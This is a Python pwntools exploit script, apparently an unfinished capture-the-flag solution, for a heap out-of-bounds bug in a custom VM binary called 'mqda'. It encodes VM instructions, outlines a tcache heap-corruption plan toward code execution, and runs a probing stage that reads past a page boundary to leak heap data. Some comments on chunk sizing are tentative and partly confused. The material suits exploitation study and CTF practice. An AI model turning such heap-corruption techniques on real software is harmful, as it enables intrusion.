#!/usr/bin/env python3
"""
Exploit for mqda VM - Heap corruption for RCE

The plan:
1. Allocate many pages to fill up heap with 0x110-sized chunks
2. Use PUSH OOB to corrupt the next chunk's header
3. Trigger cleanup to free pages, putting them in tcache
4. The corrupted chunk can then be used to get arbitrary write

Key insight: The cleanup mechanism frees pages that have all-zero data!
So if we push zeros, the page gets freed, but the OOB write persists!
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

# VM instruction encoders
def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def mov_reg_mem(reg, addr):
    """MOV reg, [addr] - mode 3"""
    return bytes([0x61, reg]) + p32(addr)

def store_mem_reg(addr_reg, val_reg):
    """STORE [addr_reg], val_reg - opcode 7, mode 1"""
    return bytes([0x27, addr_reg, val_reg])

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def add_reg_imm(reg, imm32):
    return bytes([0x44, reg]) + p32(imm32)

def sub_reg_imm(reg, imm32):
    return bytes([0x45, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def jmp_reg(reg):
    return bytes([0x0e, reg])

def trigger_illegal():
    return bytes([0xFF])

def nop():
    """No-op by doing something harmless"""
    return mov_reg_imm(14, 0)

def main():
    print("[*] Heap corruption exploit for mqda")
    
    # Strategy:
    # 1. Allocate page at address A
    # 2. Allocate page at address A+0x100 (adjacent in VM address space)
    # 3. Set SP to A+0xFF and push - this writes OOB into adjacent chunk
    # 4. What we write determines what we corrupt
    
    # The OOB write hits offset 0x103-0x106 from page base
    # malloc(0x104) chunk layout:
    #   0x00-0x07: prev_size
    #   0x08-0x0f: size
    #   0x10-0x113: usable data (0x104 bytes)
    # Total chunk size: 0x114 rounded to 0x120? Let's verify.
    
    # Actually, chunk overhead is 0x10 (prev_size + size on 64-bit)
    # But malloc(0x104) gives us 0x104 bytes
    # 0x104 + 0x10 = 0x114, aligned to 0x120
    # Hmm, that seems large...
    
    # Let me verify: chunk size for malloc(0x104):
    # min_chunk = sizeof(chunk_header) + 3*sizeof(ptr) = 0x10 + 0x18 = 0x28 (for free chunks)
    # For in-use: header + usable = 0x10 + 0x104 = 0x114
    # Aligned to 16 = 0x120
    # But tcache uses 0x110-sized bins...
    
    # Actually malloc(n) where n <= 0x100 goes into 0x110 bin
    # malloc(0x104) would need 0x114 rounded = 0x120 bin
    
    # Hmm, this might not work as expected. Let me try differently.
    
    # Alternative: use POP OOB to READ data from adjacent chunk
    # If we can leak a heap address, we can compute tcache key
    
    code = b''
    
    # Allocate many pages to get heap activity
    for i in range(10):
        addr = i * 0x100
        code += mov_reg_imm(15, addr)  # SP = page address
        code += mov_reg_imm(0, 0x41414141)  # Write non-zero to keep page alive
        code += push_reg(0)
    
    # Now try POP OOB to read beyond page boundary
    code += mov_reg_imm(15, 0x1FF)  # Page 0x100, offset 0xFF
    code += pop_reg(0)  # r0 = data at OOB location
    
    # Store the value somewhere we can check
    code += mov_reg_imm(1, 0x2000)  # Store location
    code += mov_reg_imm(15, 0x2000)
    code += push_reg(0)  # Push r0 to page 0x2000
    
    code += hlt()
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
